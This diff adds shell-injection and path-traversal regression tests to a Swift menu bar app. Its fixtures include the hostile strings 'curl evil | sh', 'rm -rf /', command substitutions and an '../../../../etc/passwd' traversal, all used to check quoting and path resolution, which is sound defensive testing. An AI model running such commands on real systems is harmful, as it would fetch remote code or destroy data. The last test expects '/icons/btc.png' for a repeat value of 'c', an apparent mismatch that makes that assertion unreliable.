@@ -1,6 +1,7 @@
 import Foundation
 import TestKit
 import FunkyBarCore
+import FunkyBarProviders
 
 // Regressions for defects found by looking at the bar next to sketchybar.
 // Each one was invisible to the rest of the suite, which is the point.
@@ -267,6 +268,7 @@ let popupAlignmentTests = Suite("Popup row alignment") { s in
 }
 
 let regressionSuites: [Suite] = [
+    injectionTests,
     popupAlignmentTests,
     providerCommandTests,
     seedRegressionTests,
@@ -303,5 +305,60 @@ let providerCommandTests = Suite("Provider commands") { s in
         let status = try t.require(item(try exampleConfig(), "status"))
         t.expectEqual(status.actions[.left], .provider(name: "status", command: "toggle"))
         t.expectEqual(status.actions[.right], .provider(name: "status", command: "settings"))
+    }
+}
+
+let injectionTests = Suite("Injection") { s in
+
+    s.test("shell quoting neutralises metacharacters") { t in
+        // An AeroSpace workspace name is whatever created it chose, and it
+        // reaches `aerospace workspace <name>`.
+        for hostile in ["1; curl evil | sh", "$(whoami)", "`id`", "a && rm -rf /", "x|y", "a\nb"] {
+            let quoted = hostile.shellQuoted
+            t.expect(quoted.hasPrefix("'") && quoted.hasSuffix("'"),
+                     "\(hostile.debugDescription) should be fully quoted, got \(quoted)")
+        }
+    }
+
+    s.test("an embedded single quote cannot break out") { t in
+        // The one character single quotes cannot themselves contain.
+        let quoted = "it's; rm -rf /".shellQuoted
+        t.expectEqual(quoted, #"'it'\''s; rm -rf /'"#)
+    }
+
+    s.test("quoting survives a real shell round trip") { t in
+        // The point is not the string shape but that sh sees one argument.
+        let runner = ProcessRunner(timeout: 5)
+        for hostile in ["1; echo PWNED", "$(echo PWNED)", "`echo PWNED`", "a' ; echo PWNED ; '"] {
+            guard case .success(let result) =
+                runner.runSynchronously("printf %s \(hostile.shellQuoted)") else {
+                t.fail("spawn failed")
+                continue
+            }
+            t.expectEqual(result.standardOutput, hostile,
+                          "shell altered \(hostile.debugDescription)")
+            t.expect(!result.standardOutput.contains("PWNED\n"), "command substitution ran")
+        }
+    }
+
+    s.test("an image path cannot traverse upward out of its directory") { t in
+        var config = ItemConfig(id: "space.evil")
+        config.repeatValue = "../../../../etc/passwd"
+        var style = StyleSpec()
+        style.image = ImageSpec(path: Template("~/.config/funkybar/icons/{repeat}.png"))
+        config.style = style
+
+        let resolved = ItemResolver.resolve(config)
+        t.expectNil(resolved.style.image?.resolvedPath,
+                    "a traversing path should resolve to nothing, not to the target")
+    }
+
+    s.test("an ordinary image path still resolves") { t in
+        var config = ItemConfig(id: "meter.c")
+        config.repeatValue = "c"
+        var style = StyleSpec()
+        style.image = ImageSpec(path: Template("/icons/{repeat}.png"))
+        config.style = style
+        t.expectEqual(ItemResolver.resolve(config).style.image?.resolvedPath, "/icons/btc.png")
     }
 }
